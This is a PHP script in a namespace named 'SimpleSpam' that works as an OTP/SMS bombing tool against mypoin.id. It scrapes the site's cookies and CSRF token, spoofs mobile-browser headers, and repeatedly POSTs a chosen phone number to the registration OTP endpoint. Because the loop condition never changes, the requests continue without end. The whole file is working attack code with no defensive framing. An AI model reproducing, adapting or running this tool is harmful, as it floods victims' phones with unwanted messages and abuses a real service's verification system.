<?php
namespace SimpleSpam;

class Otp {
	
	protected static $agent;

	function __construct() {
		self::$agent = "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36";
		ini_set("max_execution_time", 0);
		ini_set("memory_limit", "99999M");
		set_time_limit(0);
	}

	private function GetCookieMyPoin() {
		$ch = curl_init("https://mypoin.id/register/validate-phone-number");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
		$html = curl_exec($ch);
		$fields = array();
		curl_close($ch);
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $html, $cookie);
		foreach ($cookie[1] as $kuki) {
			array_push($fields, $kuki);
		}

		$dom = new \DomDocument();
		@$dom->loadHTML($html);

		$tag = $dom->getElementsByTagName("input");
		foreach ($tag as $token) {

			$csr = $token->getAttribute("name");

			if (strpos($csr, "csrfmiddlewaretoken") !==False) {
				array_push($fields, $token->getAttribute("value"));
				break;
			}
		}
		return $fields;
	}

	public function MyPoin($nomor, $loop) {
		$cookie = self::GetCookieMyPoin();
		$param = array(
			"phone" => $nomor,
			"csrfmiddlewaretoken" => $cookie[2]
		);
		$headers = array(
			"Host: mypoin.id",
			"Connection: keep-alive",
			"Sec-Fetch-Site: same-origin",
			"Sec-Fetch-Mode: cors",
			"Accept: application/json, text/javascript, */*; q=0.01",
			"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
			"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,nb;q=0.6",
			"Origin: https://mypoin.id",
			"X-Requested-With: XMLHttpRequest",
			"Referer: https://mypoin.id/register/validate-phone-number",
			"Cookie: $cookie[0]; _ga=GA1.2.1152780872.1579970310; _gid=GA1.2.1621783.1579970310; $cookie[1]; _gat_gtag_UA_108385159_1=1"
		);

		for ($i = 0; $loop > 1; $i++) {
			$ch = curl_init("https://mypoin.id/register/request-otp");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($param));
			curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			$response = curl_exec($ch);
			curl_close($ch);

		      if (strpos($response, "ok") !==False) {
				echo "\e[92m[$i] \e[0mTerkirim!\n";

			} else if (strpos($response, "1 menit") !==False) {
				echo "\e[92m[$i] \e[0mTerkirim!\n";

			} else {
				echo "\e[91m[$i] \e[0mGagal!\n";
			}
		}
	}


		}
?>
